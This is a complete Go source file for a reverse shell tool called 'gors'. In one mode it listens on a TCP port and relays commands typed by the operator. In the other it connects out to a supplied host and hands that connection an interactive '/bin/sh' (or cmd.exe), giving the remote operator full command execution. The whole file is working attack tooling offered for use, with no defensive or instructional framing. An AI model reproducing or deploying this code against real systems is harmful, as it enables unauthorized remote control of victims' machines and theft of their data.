// Go-reverse-shell

package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
)

func main() {
	// Setting up flags
	listen := flag.Bool("l", false, "Listen mode")
	PORT := flag.Int("p", 0, "-p [PORT]")
	flag.Parse()
	RHOST := flag.Arg(0)
	if len(flag.Args()) < 1 && !(*listen) {
		fmt.Println("Usage: gors -l -p [PORT]")
		fmt.Println("       gors -p [PORT] [HOST]")
    return 
	}

	// Functionality
	if *listen {
		reader := bufio.NewReader(os.Stdin)
		// Setting up listener
		listener, err := net.Listen("tcp", ":"+strconv.Itoa(*PORT))
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Printf("Listening on port %d...\n", *PORT)
		defer listener.Close()
		// Handle connections
		for {
			conn, err := listener.Accept()
			if err != nil {
				fmt.Println(err)
				continue
			}
			handleConn_AsServer(conn, reader)
		}
	} else {
		// Setting up connection
		address := RHOST + ":" + strconv.Itoa(*PORT)
		conn, err := net.Dial("tcp", address)
		if err != nil {
			fmt.Println("Error connecting to the host")
			return
		}
		// Handle connection
		fmt.Printf("Connected to %s:%d\n", RHOST, *PORT)
		handleConn(conn)
	}
	// Error handling
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("Usage: gors -l -p [PORT]")
			fmt.Println("       gors -p [PORT] [HOST]")
		}
	}()
} // main






/* Connection Handler (client) */
func handleConn(conn net.Conn) {
	defer conn.Close()

	// for linux
	cmd := exec.Command("/bin/sh", "-i")
	// for windows
	// cmd := exec.Command("cmd.exe")

	rp, wp := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = wp
  cmd.Stderr = wp

	go io.Copy(conn, rp)

	if err := cmd.Run(); err != nil {
		fmt.Println(err)
		return
	}
}






func handleConn_AsServer(conn net.Conn, reader *bufio.Reader) {
	/* Connection Handler (server) */
	for {
		buf := make([]byte, 2048)
		// Read
		conn.Read(buf)
		fmt.Printf(string(buf))

		// Write
		cmd, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
		}
		if _, err := conn.Write([]byte(cmd)); err != nil {
			fmt.Println("Error sending datagram: ", err)
		}
	}
}
